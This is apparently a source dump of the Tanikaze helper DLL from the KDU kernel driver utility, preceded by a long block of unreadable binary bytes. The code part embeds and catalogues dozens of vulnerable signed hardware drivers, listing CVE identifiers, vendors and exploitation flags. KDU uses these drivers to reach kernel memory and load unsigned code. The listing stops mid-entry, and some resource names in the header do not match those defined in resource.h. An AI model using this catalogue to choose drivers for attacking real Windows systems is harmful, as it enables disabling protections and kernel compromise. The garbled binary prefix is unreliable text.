Ù¹÷[ywU}ë}^gT¥ï@PyÀ­8Ò1à©°^ÊÀ\êÒÄ.(¨ƒ%e;1E¢èOD×Jt°´‹úÚÇúO¾lÇï™zEy,ú{ ¥Ïµë‡t%é?²û˜ëìaÊÇÖßØÇöýÐÖ£ˆÿ¿'®S7"øTþF¢gGÐ&½‘Z8É­;ØÙ‡xÏ@„~¾f³Ž<>ÂµØb‚Y÷&_ô¿ìjŠ¡Ê¾·lgÀ!2!ÏYX@;µW’ßåùL™Ün‹º/$ñÎ6„BUÍÎA½*xÜf²ùßöL$IÞª€d\Þr:ŒH,!ï!Og9­3ð5X'5y¾¿…¦²—rp7  P€nÎºëByn,L0Lûþ*$dî«w;œ0ò†Tœ!×¥6`?nÞ:zmºaAùÎ]Gn·)™ÐB .¬Ð…¬NXÐ•PÝ?‰)ÅLÿåã†L$iÝ §Ã1è+tàJˆ
IÌÅ4°§­LúH€råT”(^·ßkê3åOuî‡™¼’ïXþ½ül#B‘S7¯kç'ŽŽô²Ãµ»ñ·‘×´fÏnÛ‡úníKÏzyú4«œ:J˜låØÇ[àùÙóž¡É…&
·ŠIçuªöû]&
Œáº‡1måÈ¡^½-b±˜@ðµ³œ&+@ÌÜw8%1[Bì&ºú¯•Eî«[‘AD†¾‘u§÷ÙIRã8tzÚÓ·aÿ"màôÿŒrA³‡˜áFc(|%ýÍ=ºÿdy;‰ÅcÜ 9ÄraRpÔÓGý_/ž· ÖEþyö¦¿7†½£p_>¦Poéµj^”øÞ£Õÿ¶L«ÇÞ.	`¶úßÚç%ÞäÈ|w–£þ+*#=ëaî´>+‰¬­±b§Å&=R|ÃäŸÿ–Þh_ÉÛmM2ÐRÇ${4x+~¬Ä3SwN‰*ƒ\A¯ßÓQ]êØ<Z}=™‡>Ì§ŠÙ9Q‹'ZzÃ)ÜO^¾ø‰Î•K
Ý·‘7ûþwî÷5‘z0Ç@é²r¸„¤P‡›-ŒÐò‚$wäáPQÆµê †!,ƒ’«Ê³ëã˜ÑKÎOyÅ›Òö$õ¥Ö.n¬=ÀÕË™ðvÿ¿!_ä{´u3Ìöïš¹ªæ5Äºî»rï©ÈÇH­Pƒ¤÷á‹j†oe8ì5Yœf+ô+úŸlÞžGä4 Ìþ‡m|ë…}×ËÈÆÏ%žr­À­&’ÜÔPå‰íçhiÌ ÌõÛˆÛNí¨È%úL„%¦%/Ö5nêÄ`Éò¢|ûH€œÎeTa¯§ì_±[y>BúX‰® ¡ïv#êä;†of§kPÆŽyã(›tÎ
Î-‹ÞFiÈÅ<¬n§þoQøŒÌÆ£š0:iúêÓ\H¥x&3ieJ½Ã¦®bíãa`¿kž-[ø“êÞêéª 7‘§¹¨hRè›.cþz¦ÃU1iÙk7‹Z›æ^Ï3‚&JÒAQ/TÿË<ûpyý›ŽQ=ë\g.×>OÆW;?_Y÷+³7Éÿð;
çd<W%ÝÂ |8‡3•ƒQµ–Fœóõw}÷sÇë G)å°aåÀ±aãjjks`ød5G\2[wÞƒ#m‘ôFøøÓˆ¡K©#Ž¼4jJççßÍ%¯jPžóîWÙe+â¯ù+ûãžCPTTu´‰†×§7ÆJêøæ£æEÔr«í©¬á0µ)´A­nD¸×~M	)Ëø[³}—oì U“Oœa¼)eªÚ«ˆºO˜ÔÒË-5:’Q„&ò.­?pD¸¶
EzDzòÈ’éZ€¦ý)[t7&6äØ…"ëkN¸Äà±ýøA]–`(}b |}.I:^Š¤‘7n]´:î§Ëo¶E1ÕwzãöRr¼fjà.±ñD¥±dÁ+2²	¹NÔ±.á/…øœˆAQ‚Û÷‡5 äœmeÂÿ5‚¤Zêr°Ã-(&˜ò×8-·ª—©¬‚îÞÞÈÉ|…]ò‚Hðr¤rìñMheÚP°›KopK¸ƒØyR¬Q<èÓmBíÄí””Ç ñßRé²Îb_"çœ’ã’@{wÆý	Ý»êíö-–BÐãëînÎ'æX'h„·ÄDáü±|vB| ‚^ƒ58õ«)ŽLrXÀàæÛŽÖÒŠè_a„*UËæÌÿñÎ³êW“4~4i ‡Š¬þÍ›R’µ»…CGÊš©Û¦<¾ˆ§½½³®üÈò†ª„åª
ý6rlyIîÇœSùe¢Íà8Ö³ÿ¬Ø
```

`Source/Tanikaze/export.def`:

```def
EXPORTS
gProvTable
gVersion

```

`Source/Tanikaze/main.cpp`:

```cpp
/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2020 - 2026
*
*  TITLE:       MAIN.CPP
*
*  VERSION:     1.46
*
*  DATE:        12 Feb 2026
*
*  Tanikaze helper dll (part of KDU project).
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/

#include "tanikaze.h"

/*
* Nothing
* 
* WARNING, THIS DLL MUST BE BUILD IN RELEASE CONFIGURATION, ALWAYS.
* 
*/

```

`Source/Tanikaze/resource.h`:

```h
//{{NO_DEPENDENCIES}}
// Microsoft Visual C++ generated include file.
// Used by resource.rc
//
#define IDR_INTEL_NAL                   103
#define IDR_RZPNK                       104
#define IDR_RTCORE64                    105
#define IDR_GDRV                        106
#define IDR_ATSZIO64                    107
#define IDR_MSIO64                      108
#define IDR_GLCKIO2                     109
#define IDR_ENEIO64                     110
#define IDR_WINRING0                    111
#define IDR_ENETECHIO64                 112
#define IDR_PHYMEMX64                   113
#define IDR_RTKIO64                     114
#define IDR_ENETECHIO64B                115
#define IDR_LHA                         116
#define IDR_ASIO2                       117
#define IDR_DIRECTIO64                  118
#define IDR_GMERDRV                     119
#define IDR_DBUTIL23                    120
#define IDR_MIMIDRV                     121
#define IDR_KPH                         122
#define IDR_DBUTILDRV2                  123
#define IDR_DBK64                       124
#define IDR_ASIO3                       125
#define IDR_HW64                        126
#define IDR_SYSDRV3S                    127
#define IDR_ZEMANA                      128
#define IDR_INPOUTX64                   129
#define IDR_PASSMARK_OSF                130
#define IDR_ASROCKDRV                   131
#define IDR_ALSYSIO64                   132
#define IDR_AMD_RYZENMASTER             133
#define IDR_PHYSMEM                     134
#define IDR_LDD                         135
#define IDR_PCDSRVC                     136
#define IDR_MSI_WINIO                   137
#define IDR_HP_ETDSUPP                  138
#define IDR_KEXPLORE                    139
#define IDR_KOBJEXP                     140
#define IDR_KREGEXP                     141
#define IDR_PHYDMACC                    142
#define IDR_ECHODRV                     143
#define IDR_NVOCLOCK                    144
#define IDR_IREC                        145
#define IDR_AMD_PDFWKRNL                146
#define IDR_AMD_AOD215                  147
#define IDR_WNBIOS64                    148
#define IDR_EVGA_ELEETX1                149
#define IDR_ASROCKDRV2                  150
#define IDR_ASROCKAPPSHOP103            151
#define IDR_ASROCKDRV3                  152
#define IDR_ASROCKDRV4                  153
#define IDR_PMXDRV64                    154
#define IDR_HWRWDRVX64                  155
#define IDR_NEACSAFE64                  156
#define IDR_THROTTLESTOP                157
#define IDR_TPWSAV                      158
#define IDR_DATA_DBUTILCAT              1000
#define IDR_DATA_DBUTILINF              1001
#define IDR_DATA_KMUEXE                 1002
#define IDR_DATA_KMUSIG                 1003
#define IDR_DATA_ASUSCERTSERVICE        1004
#define IDR_DATA_NEACSAFEINF            1005
#define IDR_PROCEXP1627                 2000
#define IDR_PROCEXP1702                 2001

// Next default values for new objects
// 
#ifdef APSTUDIO_INVOKED
#ifndef APSTUDIO_READONLY_SYMBOLS
#define _APS_NEXT_RESOURCE_VALUE        160
#define _APS_NEXT_COMMAND_VALUE         40001
#define _APS_NEXT_CONTROL_VALUE         1007
#define _APS_NEXT_SYMED_VALUE           101
#endif
#endif

```

`Source/Tanikaze/resource.rc`:

```rc
// Microsoft Visual C++ generated resource script.
//
#include "resource.h"

#define APSTUDIO_READONLY_SYMBOLS
/////////////////////////////////////////////////////////////////////////////
//
// Generated from the TEXTINCLUDE 2 resource.
//
#include "winres.h"

/////////////////////////////////////////////////////////////////////////////
#undef APSTUDIO_READONLY_SYMBOLS

/////////////////////////////////////////////////////////////////////////////
// English (United States) resources

#if !defined(AFX_RESOURCE_DLL) || defined(AFX_TARG_ENU)
LANGUAGE LANG_ENGLISH, SUBLANG_ENGLISH_US
#pragma code_page(1252)

#ifdef APSTUDIO_INVOKED
/////////////////////////////////////////////////////////////////////////////
//
// TEXTINCLUDE
//

1 TEXTINCLUDE 
BEGIN
    "resource.h\0"
END

2 TEXTINCLUDE 
BEGIN
    "#include ""winres.h""\r\n"
    "\0"
END

3 TEXTINCLUDE 
BEGIN
    "\r\n"
    "\0"
END

#endif    // APSTUDIO_INVOKED


/////////////////////////////////////////////////////////////////////////////
//
// RCDATA
//

IDR_INTEL_NAL           RCDATA                  "drv\\iQVM64.bin"

IDR_PROCEXP1627         RCDATA                  "drv\\procexp1627.bin"

IDR_RTCORE64            RCDATA                  "drv\\RTCore64.bin"

IDR_GDRV                RCDATA                  "drv\\gdrv.bin"

IDR_ATSZIO64            RCDATA                  "drv\\ATSZIO64.bin"

IDR_MSIO64              RCDATA                  "drv\\msio64.bin"

IDR_GLCKIO2             RCDATA                  "drv\\glckio2.bin"

IDR_ENEIO64             RCDATA                  "drv\\eneio64.bin"

IDR_WINRING0            RCDATA                  "drv\\WinRing0x64.bin"

IDR_ENETECHIO64         RCDATA                  "drv\\enetechio64.bin"

IDR_PHYMEMX64           RCDATA                  "drv\\phymemx64.bin"

IDR_RTKIO64             RCDATA                  "drv\\rtkio64.bin"

IDR_ENETECHIO64B        RCDATA                  "drv\\ene2.bin"

IDR_LHA                 RCDATA                  "drv\\lha.bin"

IDR_ASIO2               RCDATA                  "drv\\asio2.bin"

IDR_DIRECTIO64          RCDATA                  "drv\\DirectIo64.bin"

IDR_GMERDRV             RCDATA                  "drv\\gmerdrv.bin"

IDR_DBUTIL23            RCDATA                  "drv\\DbUtil2_3.bin"

IDR_MIMIDRV             RCDATA                  "drv\\mimidrv.bin"

IDR_KPH                 RCDATA                  "drv\\kprocesshacker.bin"

IDR_DBUTILDRV2          RCDATA                  "drv\\dbutildrv2.bin"

IDR_DATA_DBUTILCAT      RCDATA                  "data\\dbutilcat.bin"

IDR_DATA_DBUTILINF      RCDATA                  "data\\dbutilinf.bin"

IDR_DATA_KMUEXE         RCDATA                  "data\\KMUEXE.bin"

IDR_DATA_KMUSIG         RCDATA                  "data\\KMUSIG.bin"

IDR_DBK64               RCDATA                  "drv\\dbk64.bin"

IDR_ASIO3               RCDATA                  "drv\\AsIO3.bin"

IDR_DATA_ASUSCERTSERVICE RCDATA                  "data\\AsusCertService.bin"

IDR_HW64                RCDATA                  "drv\\HW64.bin"

IDR_SYSDRV3S            RCDATA                  "drv\\SysDrv3S.bin"

IDR_ZEMANA              RCDATA                  "drv\\amsdk.bin"

IDR_INPOUTX64           RCDATA                  "drv\\inpoutx64.bin"

IDR_PASSMARK_OSF        RCDATA                  "drv\\DirectIo64_2.bin"

IDR_ASROCKDRV           RCDATA                  "drv\\AsrDrv106.bin"

IDR_ALSYSIO64           RCDATA                  "drv\\ALSysIO64.bin"

IDR_AMD_RYZENMASTER     RCDATA                  "drv\\AMDRyzenMasterDriver.bin"

IDR_PHYSMEM             RCDATA                  "drv\\physmem.bin"

IDR_PROCEXP1702         RCDATA                  "drv\\procexp1702.bin"

IDR_LDD                 RCDATA                  "drv\\LDD.bin"

IDR_PCDSRVC             RCDATA                  "drv\\pcdsrvc_x64.bin"

IDR_MSI_WINIO           RCDATA                  "drv\\heavenluo.bin"

IDR_HP_ETDSUPP          RCDATA                  "drv\\etdsupp.bin"

IDR_KEXPLORE            RCDATA                  "drv\\KExplore.bin"

IDR_KOBJEXP             RCDATA                  "drv\\KObjExp.bin"

IDR_KREGEXP             RCDATA                  "drv\\KRegExp.bin"

IDR_ECHODRV             RCDATA                  "drv\\echo_driver.bin"

IDR_NVOCLOCK            RCDATA                  "drv\\nvoclock.bin"

IDR_IREC                RCDATA                  "drv\\irec.bin"

IDR_PHYDMACC            RCDATA                  "drv\\PhyDMACC.bin"

IDR_RZPNK               RCDATA                  "drv\\rzpnk.bin"

IDR_AMD_PDFWKRNL        RCDATA                  "drv\\PdFwKrnl.bin"

IDR_AMD_AOD215          RCDATA                  "drv\\AODDriver215.bin"

IDR_WNBIOS64            RCDATA                  "drv\\wnBios64.bin"

IDR_EVGA_ELEETX1        RCDATA                  "drv\\eleetx1.bin"

IDR_ASROCKDRV2          RCDATA                  "drv\\AxtuDrv.bin"

IDR_ASROCKAPPSHOP103    RCDATA                  "drv\\AppShopDrv103.bin"

IDR_ASROCKDRV3          RCDATA                  "drv\\AsrDrv107n.bin"

IDR_ASROCKDRV4          RCDATA                  "drv\\AsrDrv107.bin"

IDR_PMXDRV64            RCDATA                  "drv\\pmxdrv64.bin"

IDR_HWRWDRVX64          RCDATA                  "drv\\HwRwDrv.x64.bin"

IDR_DATA_NEACSAFEINF    RCDATA                  "data\\NeacSafe64Cat.bin"

IDR_NEACSAFE64          RCDATA                  "drv\\NeacSafe64.bin"

IDR_THROTTLESTOP        RCDATA                  "drv\\ThrottleStop.bin"

IDR_TPWSAV              RCDATA                  "drv\\TPwSav.bin"


/////////////////////////////////////////////////////////////////////////////
//
// Version
//

VS_VERSION_INFO VERSIONINFO
 FILEVERSION 1,4,6,2602
 PRODUCTVERSION 1,4,6,2602
 FILEFLAGSMASK 0x3fL
#ifdef _DEBUG
 FILEFLAGS 0x1L
#else
 FILEFLAGS 0x0L
#endif
 FILEOS 0x40004L
 FILETYPE 0x2L
 FILESUBTYPE 0x0L
BEGIN
    BLOCK "StringFileInfo"
    BEGIN
        BLOCK "040904b0"
        BEGIN
            VALUE "CompanyName", "UG North"
            VALUE "FileDescription", "Kernel Driver Utility Database"
            VALUE "FileVersion", "1.4.6.2602"
            VALUE "InternalName", "Tanikaze.dll"
            VALUE "LegalCopyright", "Copyright (C) 2020 - 2026 KDU Project"
            VALUE "OriginalFilename", "Tanikaze.dll"
            VALUE "ProductName", "KDU"
            VALUE "ProductVersion", "1.4.6.2602"
        END
    END
    BLOCK "VarFileInfo"
    BEGIN
        VALUE "Translation", 0x409, 1200
    END
END

#endif    // English (United States) resources
/////////////////////////////////////////////////////////////////////////////



#ifndef APSTUDIO_INVOKED
/////////////////////////////////////////////////////////////////////////////
//
// Generated from the TEXTINCLUDE 3 resource.
//


/////////////////////////////////////////////////////////////////////////////
#endif    // not APSTUDIO_INVOKED


```

`Source/Tanikaze/tanikaze.h`:

```h
/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2020 - 2026
*
*  TITLE:       TANIKAZE.H
*
*  VERSION:     1.46
*
*  DATE:        12 Feb 2026
*
*  Tanikaze helper dll (part of KDU project).
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/
#include <Windows.h>
#include "Shared/consts.h"
#include "Shared/ntos/ntbuilds.h"
#include "Shared/kdubase.h"
#include "resource.h"

#pragma once

KDU_DB_ENTRY gProvEntry[] = {
   {
        KDU_MIN_NTBUILDNUMBER,
        KDU_MAX_NTBUILDNUMBER,
        IDR_INTEL_NAL,
        KDU_PROVIDER_INTEL_NAL,
        KDU_VICTIM_DEFAULT,
        SourceBaseNone,
        KDUPROV_FLAGS_PREFER_PHYSICAL,
        KDUPROV_SC_ALL_DEFAULT,
        (LPWSTR)L"CVE-2015-2291",
        (LPWSTR)L"NalDrv",
        (LPWSTR)L"Nal",
        (LPWSTR)L"Intel Corporation"
    },

    {
        KDU_MIN_NTBUILDNUMBER,
        KDU_MAX_NTBUILDNUMBER,
        IDR_RTCORE64,
        KDU_PROVIDER_UNWINDER_RTCORE,
        KDU_VICTIM_DEFAULT,
        SourceBaseNone,
        KDUPROV_FLAGS_NONE,
        KDUPROV_SC_ALL_DEFAULT,
        (LPWSTR)L"CVE-2019-16098",
        (LPWSTR)L"RTCore64",
        (LPWSTR)L"RTCore64",
        (LPWSTR)L"MICRO-STAR INTERNATIONAL CO., LTD."
    },

    {
        KDU_MIN_NTBUILDNUMBER,
        KDU_MAX_NTBUILDNUMBER,
        IDR_GDRV,
        KDU_PROVIDER_GIGABYTE_GDRV,
        KDU_VICTIM_DEFAULT,
        SourceBaseMapMem,
        KDUPROV_FLAGS_PML4_FROM_LOWSTUB,
        KDUPROV_SC_ALL_DEFAULT,
        (LPWSTR)L"CVE-2018-19320",
        (LPWSTR)L"Gdrv",
        (LPWSTR)L"GIO",
        (LPWSTR)L"Giga-Byte Technology"
    },

    {
        KDU_MIN_NTBUILDNUMBER,
        KDU_MAX_NTBUILDNUMBER,
        IDR_ATSZIO64,
        KDU_PROVIDER_ASUSTEK_ATSZIO,
        KDU_VICTIM_DEFAULT,
        SourceBaseNone,
        KDUPROV_FLAGS_PML4_FROM_LOWSTUB,
        KDUPROV_SC_ALL_DEFAULT,
        (LPWSTR)L"ASUSTeK WinFlash",
        (LPWSTR)L"ATSZIO",
        (LPWSTR)L"ATSZIO",
        (LPWSTR)L"ASUSTeK Computer Inc."
    },

    {
        KDU_MIN_NTBUILDNUMBER,
        KDU_MAX_NTBUILDNUMBER,
        IDR_MSIO64,
        KDU_PROVIDER_PATRIOT_MSIO64,
        KDU_VICTIM_DEFAULT,
        SourceBaseWinIo,
        KDUPROV_FLAGS_SIGNATURE_WHQL | KDUPROV_FLAGS_PML4_FROM_LOWSTUB,
        KDUPROV_SC_ALL_DEFAULT,
        (LPWSTR)L"CVE-2019-18845",
        (LPWSTR)L"MsIo64",
        (LPWSTR)L"MsIo",
        (LPWSTR)L"MICSYS Technology Co., Ltd."
    },

    {
        KDU_MIN_NTBUILDNUMBER,
        KDU_MAX_NTBUILDNUMBER,
        IDR_GLCKIO2,
        KDU_PROVIDER_GLCKIO2,
        KDU_VICTIM_DEFAULT,
        SourceBaseWinIo,
        KDUPROV_FLAGS_PML4_FROM_LOWSTUB,
        KDUPROV_SC_ALL_DEFAULT,
        (LPWSTR)L"ASRock Polychrome RGB, multiple CVE ids",
        (LPWSTR)L"GLCKIo2",
        (LPWSTR)L"GLCKIo2",
        (LPWSTR)L"ASUSTeK Computer Inc."
    },

    {
        KDU_MIN_NTBUILDNUMBER,
        KDU_MAX_NTBUILDNUMBER,
        IDR_ENEIO64,
        KDU_PROVIDER_ENEIO64,
        KDU_VICTIM_DEFAULT,
        SourceBaseWinIo,
        KDUPROV_FLAGS_SIGNATURE_WHQL | KDUPROV_FLAGS_PML4_FROM_LOWSTUB,
        KDUPROV_SC_ALL_DEFAULT,
        (LPWSTR)L"G.SKILL Trident Z Lighting Control",
        (LPWSTR)L"EneIo64",
        (LPWSTR)L"EneIo",
        (LPWSTR)L"Microsoft Windows Hardware Compatibility Publisher"
    },

    {
        KDU_MIN_NTBUILDNUMBER,
        NT_WIN10_REDSTONE3,
        IDR_WINRING0,
        KDU_PROVIDER_WINRING0,
        KDU_VICTIM_PE1627,
        SourceBaseWinRing0,
        KDUPROV_FLAGS_PML4_FROM_LOWSTUB,
        KDUPROV_SC_ALL_DEFAULT,
        (LPWSTR)L"EVGA Precision X1",
        (LPWSTR)L"WinRing0x64",
        (LPWSTR)L"WinRing0_1_2_0",
        (LPWSTR)L"EVGA"
    },

    {
        KDU_MIN_NTBUILDNUMBER,
        KDU_MAX_NTBUILDNUMBER,
        IDR_ENETECHIO64,
        KDU_PROVIDER_ENETECHIO64,
        KDU_VICTIM_DEFAULT,
        SourceBaseWinIo,
        KDUPROV_FLAGS_SIGNATURE_WHQL | KDUPROV_FLAGS_PML4_FROM_LOWSTUB,
        KDUPROV_SC_ALL_DEFAULT,
        (LPWSTR)L"Thermaltake TOUGHRAM Software",
        (LPWSTR)L"EneTechIo64",
        (LPWSTR)L"EneTechIo",
        (LPWSTR)L"Microsoft Windows Hardware Compatibility Publisher"
    },

    {
        KDU_MIN_NTBUILDNUMBER,
        KDU_MAX_NTBUILDNUMBER,
        IDR_PHYMEMX64,
        KDU_PROVIDER_PHYMEM64,
        KDU_VICTIM_DEFAULT,
        SourceBaseWinIo,
        KDUPROV_FLAGS_SIGNATURE_WHQL | KDUPROV_FLAGS_PML4_FROM_LOWSTUB,
        KDUPROV_SC_ALL_DEFAULT,
        (LPWSTR)L"Huawei MateBook Manager",
        (LPWSTR)L"phymemx64",
        (LPWSTR)L"PhyMem",
        (LPWSTR)L"Huawei Technologies Co.,Ltd."
    },

    {
        KDU_MIN_NTBUILDNUMBER,
        NT_WIN10_REDSTONE3,
        IDR_RTKIO64,
        KDU_PROVIDER_RTKIO64,
        KDU_VICTIM_DEFAULT,
        SourceBasePhyMem,
        KDUPROV_FLAGS_SIGNATURE_WHQL | KDUPROV_FLAGS_PML4_FROM_LOWSTUB,
        KDUPROV_SC_ALL_DEFAULT,
        (LPWSTR)L"Realtek Dash Client Utility",
        (LPWSTR)L"rtkio64",
        (LPWSTR)L"rtkio",
        (LPWSTR)L"Realtek Semiconductor Corp."
    },

    {
        KDU_MIN_NTBUILDNUMBER,
        KDU_MAX_NTBUILDNUMBER,
        IDR_ENETECHIO64B,
        KDU_PROVIDER_ENETECHIO64B,
        KDU_VICTIM_DEFAULT,
        SourceBaseWinIo,
        KDUPROV_FLAGS_SIGNATURE_WHQL | KDUPROV_FLAGS_PML4_FROM_LOWSTUB,
        KDUPROV_SC_ALL_DEFAULT,
        (LPWSTR)L"MSI Dragon Center",
        (LPWSTR)L"EneTechIo64",
        (LPWSTR)L"EneTechIo",
        (LPWSTR)L"Microsoft Windows Hardware Compatibility Publisher"
    },

    {
        KDU_MIN_NTBUILDNUMBER,
        NT_WIN10_REDSTONE3,
        IDR_LHA,
        KDU_PROVIDER_LHA,
        KDU_VICTIM_DEFAULT,
        SourceBaseNone,
        KDUPROV_FLAGS_PML4_FROM_LOWSTUB,
        KDUPROV_SC_ALL_DEFAULT,
        (LPWSTR)L"CVE-2019-8372",
        (LPWSTR)L"lha",
        (LPWSTR)L"{E8F2FF20-6AF7-4914-9398-CE2132FE170F}",
        (LPWSTR)L"LG Electronics Inc."
    },

    {
        KDU_MIN_NTBUILDNUMBER,
        KDU_MAX_NTBUILDNUMBER,
        IDR_ASUSIO2,
        KDU_PROVIDER_ASUSIO2,
        KDU_VICTIM_DEFAULT,
        SourceBaseWinIo,
        KDUPROV_FLAGS_SIGNATURE_WHQL | KDUPROV_FLAGS_PML4_FROM_LOWSTUB,
        KDUPROV_SC_ALL_DEFAULT,
        (LPWSTR)L"ASUS GPU Tweak",
        (LPWSTR)L"AsIO2",
        (LPWSTR)L"Asusgio2",
        (LPWSTR)L"ASUSTeK Computer Inc."
    },

    {
        KDU_MIN_NTBUILDNUMBER,
        KDU_MAX_NTBUILDNUMBER,
        IDR_DIRECTIO64,
        KDU_PROVIDER_DIRECTIO64,
        KDU_VICTIM_DEFAULT,
        SourceBaseNone,
        KDUPROV_FLAGS_SIGNATURE_WHQL | KDUPROV_FLAGS_PML4_FROM_LOWSTUB,
        KDUPROV_SC_ALL_DEFAULT,
        (LPWSTR)L"PassMark DirectIO",
        (LPWSTR)L"DirectIo64",
        (LPWSTR)L"DIRECTIO64",
        (LPWSTR)L"PassMark Software Pty Ltd"
    },

    {
        KDU_MIN_NTBUILDNUMBER,
        KDU_MAX_NTBUILDNUMBER,
        IDR_GMERDRV,
        KDU_PROVIDER_GMER,
        KDU_VICTIM_DEFAULT,
        SourceBaseNone,
        KDUPROV_FLAGS_NO_FORCED_SD,
        KDUPROV_SC_ALL_DEFAULT,
        (LPWSTR)L"Gmer 'Antirootkit'",
        (LPWSTR)L"gmerdrv",
        (LPWSTR)L"gmerdrv",
        (LPWSTR)L"GMEREK Systemy Komputerowe Przemyslaw Gmerek"
    },

    {
        KDU_MIN_NTBUILDNUMBER,
        KDU_MAX_NTBUILDNUMBER,
        IDR_DBUTIL23,
        KDU_PROVIDER_DBUTIL23,
        KDU_VICTIM_DEFAULT,
        SourceBaseNone,
        KDUPROV_FLAGS_NO_UNLOAD_SUP,
        KDUPROV_SC_ALL_DEFAULT,
        (LPWSTR)L"CVE-2021-21551",
        (LPWSTR)L"DBUtil23",
        (LPWSTR)L"DBUtil_2_3",
        (LPWSTR)L"Dell Inc."
    },

    {
        KDU_MIN_NTBUILDNUMBER,
        KDU_MAX_NTBUILDNUMBER,
        IDR_MIMIDRV,
        KDU_PROVIDER_MIMIDRV,
        KDU_VICTIM_DEFAULT,
        SourceBaseNone,
        KDUPROV_FLAGS_NONE,
        KDUPROV_SC_ALL_DEFAULT,
        (LPWSTR)L"Mimikatz mimidrv",
        (LPWSTR)L"mimidrv",
        (LPWSTR)L"mimidrv",
        (LPWSTR)L"Benjamin Delpy"
    },

    {
        KDU_MIN_NTBUILDNUMBER,
        NT_WIN10_21H2,
        IDR_KPH,
        KDU_PROVIDER_KPH,
        KDU_VICTIM_DEFAULT,
        SourceBaseNone,
        KDUPROV_FLAGS_NO_FORCED_SD | KDUPROV_FLAGS_PML4_FROM_LOWSTUB | KDUPROV_FLAGS_OPENPROCESS_SUPPORTED,
        KDUPROV_SC_ALL_DEFAULT,
        (LPWSTR)L"KProcessHacker",
        (LPWSTR)L"KProcessHacker",
        (LPWSTR)L"KProcessHacker2",
        (LPWSTR)L"Wen Jia Liu"
    },

    {
        KDU_MIN_NTBUILDNUMBER,
        NT_WIN10_21H2,
        IDR_PROCEXP1627,
        KDU_PROVIDER_PROCEXP,
        KDU_VICTIM_PE1627,
        SourceBaseNone,
        KDUPROV_FLAGS_SIGNATURE_WHQL | KDUPROV_FLAGS_NO_FORCED_SD | KDUPROV_FLAGS_PML4_FROM_LOWSTUB | KDUPROV_FLAGS_NO_VICTIM | KDUPROV_FLAGS_OPENPROCESS_SUPPORTED,
        KDUPROV_SC_ALL_DEFAULT,
        (LPWSTR)PROCEXP1627_DESC,
        (LPWSTR)PROCEXP152,
        (LPWSTR)PROCEXP152,
        (LPWSTR)L"Microsoft Windows Hardware Compatibility Publisher"
    },

    {
        NT_WIN10_THRESHOLD1,
        KDU_MAX_NTBUILDNUMBER,
        IDR_DBUTILDRV2,
        KDU_PROVIDER_DBUTILDRV2,
        KDU_VICTIM_DEFAULT,
        SourceBaseNone,
        KDUPROV_FLAGS_SIGNATURE_WHQL | KDUPROV_FLAGS_NO_FORCED_SD,
        KDUPROV_SC_ALL_DEFAULT,
        (LPWSTR)L"CVE-2021-36276",
        (LPWSTR)L"DBUtilDrv2",
        (LPWSTR)L"DBUtil_2_5",
        (LPWSTR)L"Microsoft Windows Hardware Compatibility Publisher"
    },

    {
        KDU_MIN_NTBUILDNUMBER,
        KDU_MAX_NTBUILDNUMBER,
        IDR_DBK64,
        KDU_PROVIDER_DBK64,
        KDU_VICTIM_DEFAULT,
        SourceBaseNone,
        KDUPROV_FLAGS_SIGNATURE_WHQL | KDUPROV_FLAGS_NO_FORCED_SD | KDUPROV_FLAGS_NO_VICTIM | KDUPROV_FLAGS_OPENPROCESS_SUPPORTED,
        KDUPROV_SC_V4,
        (LPWSTR)L"Cheat Engine Dbk64",
        (LPWSTR)L"CEDRIVER73",
        (LPWSTR)L"CEDRIVER73",
        (LPWSTR)L"Cheat Engine"
    },

    {
        KDU_MIN_NTBUILDNUMBER,
        KDU_MAX_NTBUILDNUMBER,
        IDR_ASUSIO3,
        KDU_PROVIDER_ASUSIO3,
        KDU_VICTIM_DEFAULT,
        SourceBaseWinIo,
        KDUPROV_FLAGS_SIGNATURE_WHQL | KDUPROV_FLAGS_PML4_FROM_LOWSTUB,
        KDUPROV_SC_ALL_DEFAULT,
        (LPWSTR)L"ASUS GPU Tweak II",
        (LPWSTR)L"AsIO3",
        (LPWSTR)L"Asusgio3",
        (LPWSTR)L"ASUSTeK Computer Inc."
    },

    {
        KDU_MIN_NTBUILDNUMBER,
        KDU_MAX_NTBUILDNUMBER,
        IDR_HW64,
        KDU_PROVIDER_HW64,
        KDU_VICTIM_DEFAULT,
        SourceBaseNone,
        KDUPROV_FLAGS_PML4_FROM_LOWSTUB,
        KDUPROV_SC_ALL_DEFAULT,
        (LPWSTR)L"Marvin Hardware Access Driver for Windows",
        (LPWSTR)L"hw64",
        (LPWSTR)L"hw",
        (LPWSTR)L"Marvin Test Solutions, Inc."
    },

    {
        KDU_MIN_NTBUILDNUMBER,
        KDU_MAX_NTBUILDNUMBER,
        IDR_SYSDRV3S,
        KDU_PROVIDER_SYSDRV3S,
        KDU_VICTIM_DEFAULT,
        SourceBaseMapMem,
        KDUPROV_FLAGS_PML4_FROM_LOWSTUB | KDUPROV_FLAGS_NO_UNLOAD_SUP,
        KDUPROV_SC_ALL_DEFAULT,
        (LPWSTR)L"CODESYS SysDrv3S (CVE-2022-22516)",
        (LPWSTR)L"SysDrv3S",
        (LPWSTR)L"SysDrv3S",
        (LPWSTR)L"3S-Smart Software Solutions GmbH."
    },

    {
        NT_WIN8_BLUE,
        KDU_MAX_NTBUILDNUMBER,
        IDR_ZEMANA,
        KDU_PROVIDER_ZEMANA,
        KDU_VICTIM_PE1702,
        SourceBaseNone,
        KDUPROV_FLAGS_SIGNATURE_WHQL | KDUPROV_FLAGS_OPENPROCESS_SUPPORTED,
        KDUPROV_SC_V4,
        (LPWSTR)L"Zemana (CVE-2021-31728, CVE-2022-42045)",
        (LPWSTR)L"ZemanaAntimalware",
        (LPWSTR)L"amsdk",
        (LPWSTR)L"WATCHDOGDEVELOPMENT.COM, LLC"
    },

    {
        KDU_MIN_NTBUILDNUMBER,
        KDU_MAX_NTBUILDNUMBER,
        IDR_INPOUTX64,
